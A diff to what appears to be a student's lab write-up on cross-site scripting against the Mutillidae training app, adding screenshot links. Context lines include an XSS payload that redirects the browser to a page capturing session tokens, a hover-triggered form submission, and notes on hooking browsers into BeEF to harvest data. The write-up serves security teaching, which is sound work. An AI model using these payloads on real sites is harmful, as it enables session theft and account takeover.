@@ -50,6 +50,8 @@ The steps above:
 - Grabbing session tokens using `<script>document.location="http://oabolurin-uws/mutillidae/index.php?page=capture-data.php"</script>`
 
 📸 See `screenshots/slide01.png` and `slide02.png`
+<img width="1531" height="745" alt="Slide 1" src="https://github.com/user-attachments/assets/ba482c8a-6ceb-4ae7-8a5e-21b548fc63f7" />
+
 
 The problem at this point is that we are redirecting the user to a specific page that is capturing the data, and they will know something has happened. In real situation, the user wouldn’t be redirected, the data would simply get logged in the background.
 Next, i used a script that comes with Mutillidae to log data in the background
@@ -110,6 +112,8 @@ On my Kali Linux VM
 I navigated to the View Captured Data Page to see the information that was logged in the background
 
 📸 See `screenshots/slide02.png`
+<img width="1523" height="788" alt="Slide 2" src="https://github.com/user-attachments/assets/6e8dd724-2485-4c59-8c63-584761e14480" />
+
 
 ---
 
@@ -169,6 +173,8 @@ Lab achievements:
   <i onmouseover="window.document.getElementById('f').submit()">oabolurin will get A+ in this course</i>
 
 📸 See screenshots/slide03.png
+<img width="1533" height="580" alt="Slide 3" src="https://github.com/user-attachments/assets/a71fd556-538b-4a8e-9d8b-afa828036aac" />
+
 
 Explanation:
 
@@ -229,6 +235,7 @@ I issued the following commands in Kali Linux:
 ▪ date
 
 📸 See screenshots/slide04.png and HTML file testanswers.html
+<img width="748" height="752" alt="Slide 4" src="https://github.com/user-attachments/assets/eec4904c-8c93-48a3-bd4a-66373f078ee9" />
 
 
 Lab achievements:
@@ -288,6 +295,7 @@ Lab achievements:
 - Hovered to trigger browser hook to BeEF panel
 
 📸 See screenshots/slide05.png
+<img width="1387" height="797" alt="Slide 5" src="https://github.com/user-attachments/assets/3a03fdef-0796-4544-80f9-c1b0220b4772" />
 
 ---
 
@@ -305,6 +313,7 @@ Lab achievements:
 - I dentified host environment in BeEF details tab
 
 📸 See screenshots/slide06.png
+<img width="1527" height="719" alt="Slide 6" src="https://github.com/user-attachments/assets/0c8f004e-9aa6-4f15-a631-0889794f0f2d" />
 
 ---
 
@@ -326,6 +335,7 @@ Check back to the BeEF Control Panel and see if you can see the data the user ha
 - Verified harvested data from BeEF control panel
 
 📸 See screenshots/slide07.png
+<img width="1530" height="715" alt="Slide 7" src="https://github.com/user-attachments/assets/7687a42f-b439-4bbf-a8a0-b8797aedf87e" />
 
 ---
 
